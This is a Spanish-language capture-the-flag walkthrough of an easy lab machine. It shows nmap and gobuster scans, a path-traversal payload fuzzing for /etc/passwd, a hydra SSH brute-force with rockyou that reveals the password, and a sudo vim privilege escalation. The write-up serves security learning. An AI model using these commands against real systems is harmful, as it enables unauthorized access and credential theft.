tags: #muy-facil #hydra 
____________________
Comenzamos ejecutando el escaneo básico de puertos utilizando el siguiente comando:
```bash
 nmap -sS -p- 172.18.0.2 --open --min-rate 4000 -vvv -oN ports 
```

![[Anexos/Pasted image 20251008112255.png]]

Al ver que están abiertos los puertos 22 y 80, ejecutamos un escaneo más enfocado en conocer la versión de los servicios que corren por esos puertos, así como enviar unos scripts básicos de reconocimiento: 
```bash
nmap -sCV -p22,80 172.18.0.2 -oN versions
```

Vemos que no observamos nada especial:

![[Anexos/Pasted image 20251008112725.png]]

Sabemos que por el puerto 80 corre un servicio web, así que vamos al navegador a ver de que se trata:

![[Anexos/Pasted image 20251008112858.png]]

Se trata de la página por defecto de apache. Vamos a proceder a aplicar fuzzing para descubrir directorios ocultos y ver hasta donde podemos llegar. Para ello voy a utilizar gobuster, con el siguiente comando:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 10 -o dirs.txt
```

Obtenemos lo siguiente, y lo exportamos al archivo dirs.txt

![[Anexos/Pasted image 20251008113422.png]]

Esta información es muy relevante. El archivo index.html es la misma página por defecto de apache, así que enfocaremos el ataque en el archivo .php, el cual se ve de esta forma después de añadirlo en la url:

![[Anexos/Pasted image 20251008113651.png]]

En este punto, me da por probar php wrappers sin éxito, por lo que decido hacer fuzzing para intentar descubrir parámetros ocultos en el archivo .php para intentar hacer un LFI. Para ello uso gobuster en modo fuzz, con el siguiente comando:

```bash
gobuster fuzz -u http://172.18.0.2/secret.php?FUZZ=....//....//....//....//....//....//....//etc///passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10
```

No hay éxito, así que voy a optar por intentar hacer fuerza bruta con el usuario mario para intentar abusar del servicio ssh. Para ello utilizo hydra con el siguiente comando:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -s 22 -t 4 -I
```

![[Anexos/Pasted image 20251008140608.png]]

Obtenemos la contraseña, la cual es **chocolate** y accedemos mediante ssh con el siguiente comando:

```bash
ssh mario@172.17.0.2
``` 

Y con esto, estamos dentro:

![[Anexos/Pasted image 20251008140804.png]]

Ahora, vamos a ejecutar el siguiente comando para buscar binarios con permiso SUID para efectuar la escalada. Y mas tarde usar el comando **sudo -l** para revisar posibles permisos, y obtenemos lo siguiente:

```bash
find / -perm -4000 2>/dev/null
```

![[Anexos/Pasted image 20251008141710.png]]

Vemos que podemos ejecutar como sudo el binario vim, así que lo consultamos en https://gtfobins.github.io/gtfobins/ y obtenenemos lo siguiente:

![[Anexos/Pasted image 20251008141838.png]]

Ejecutamos el comando y... root!

![[Anexos/Pasted image 20251008141927.png]]
